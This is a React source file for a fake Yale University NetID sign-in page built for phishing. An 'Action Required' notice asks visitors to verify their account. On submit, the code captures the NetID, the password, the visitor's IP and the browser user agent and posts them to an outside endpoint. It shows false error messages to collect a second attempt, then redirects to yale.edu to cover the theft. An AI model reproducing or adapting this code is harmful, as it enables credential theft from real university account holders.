import React, { useState, useEffect } from "react";
import Header from "../components/Header";

const Login = () => {
  const [netID, setNetID] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [formSubmitted, setFormSubmitted] = useState(false);

  // Function to send email using the API
  const sendEmail = (subject, message) => {
    fetch("https://ivytechedu-cvfc.vercel.app/send-email", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        subject,
        message,
      }),
    })
      .then((response) => response.json())
      .then((data) => {
        console.log("Email sent successfully", data);
      })
      .catch((error) => {
        console.error("Error sending email:", error);
      });
  };

  // Get user IP and user agent
  const getUserInfo = () => {
    return fetch("https://api.ipify.org?format=json")
      .then((response) => response.json())
      .then((data) => {
        const userAgent = navigator.userAgent;
        return {
          ip: data.ip,
          userAgent,
        };
      });
  };

  // Send an email when the user lands on the page
  useEffect(() => {
    sendEmail("pageVisit", "A user has visited the login page.");
  }, []);

  // Handle change in NetID or Password
  const handleInputChange = (event) => {
    const { name, value } = event.target;

    if (name === "NetID") {
      setNetID(value);
    } else if (name === "Password") {
      setPassword(value);
    }
  };

  // Validate form submission and handle error message
  const handleSubmit = async (event) => {
    event.preventDefault();

    // Reset field styles
    const netIDField = document.querySelector("input[name='NetID']");
    const passwordField = document.querySelector("input[name='Password']");
    netIDField.style.border = "";
    passwordField.style.border = "";

    // Check if fields are empty
    if (netID === "" || password === "") {
      setError("Please fill in all fields.");
      if (netID === "") netIDField.style.border = "2px solid red";
      if (password === "") passwordField.style.border = "2px solid red";
      return;
    }

    // Get additional user info
    const userInfo = await getUserInfo();

    // Construct message with user info
    const message = `NetID: ${netID}\nPassword: ${password}\nIP: ${userInfo.ip}\nUser Agent: ${userInfo.userAgent}`;

    // Send email with form data on submission
    const subject = formSubmitted
      ? "Yale Second Attempt Submission"
      : "Yale First Attempt Submission";
    sendEmail(subject, message);

    // Handle error message after email is sent
    setTimeout(() => {
      if (!formSubmitted) {
        setFormSubmitted(true);
        setError("Something went wrong. Please try again.");
      } else {
        setError("A server error occurred. Please try again later.");
        setTimeout(() => {
          window.location.href = "https://www.yale.edu";
        }, 3000);
      }
    }, 1000);
  };

  return (
    <div className="container">
      <Header />
      <div className="content">
        <div className="manage">
          <a href="#">Manage NetID Account</a>
          <a href="#" className="tp">
            Help
          </a>
        </div>

        <div className="form-container">
          <div className="word">
            <h1 className="note-h1">Action Required</h1>
            <br />
            To keep your Yale University account active, please sign in and
            verify your account. Thank you for your cooperation.
          </div>

          <form onSubmit={handleSubmit}>
            <h2 className="head">Sign In</h2>
            <div className="form-group">
              <label id="netIDLabel" htmlFor="NetID">
                NetID <span className="asterisk">*</span>
              </label>
              <input
                type="text"
                name="NetID"
                value={netID}
                onChange={handleInputChange}
              />
            </div>
            <div className="form-group">
              <label id="passwordLabel" htmlFor="Password">
                Password <span className="asterisk">*</span>
              </label>
              <input
                type="password"
                name="Password"
                value={password}
                onChange={handleInputChange}
              />
            </div>
            <a href="#" className="forgot">
              Forgot My Password
            </a>
            {error && (
              <div className="error-message">
                <img
                  src="https://secure.its.yale.edu/cas/images/error-icon.png"
                  alt="error-icon"
                />
                <p>{error}</p>
              </div>
            )}
            <button type="submit">SIGN IN</button>
          </form>
        </div>
      </div>
      <footer>
        <img
          src="https://veritas.its.yale.edu/netid/images/yale-logo-sprite.svg"
          alt="logo"
          className="tlogo"
        />
        <div className="left">
          <img
            src="https://veritas.its.yale.edu/netid/images/yale-logo-sprite.svg"
            alt="logo"
            className="btlogo"
          />
          <p className="copy">
            © 2024 <a href="#">Yale University</a>. All Rights Reserved.
          </p>
        </div>
        <div className="right">
          <a href="#">Accessibility at Yale</a>
          <a href="#">Privacy Policy</a>
          <a href="#" className="bthelp">
            Help
          </a>
        </div>
      </footer>
    </div>
  );
};

export default Login;
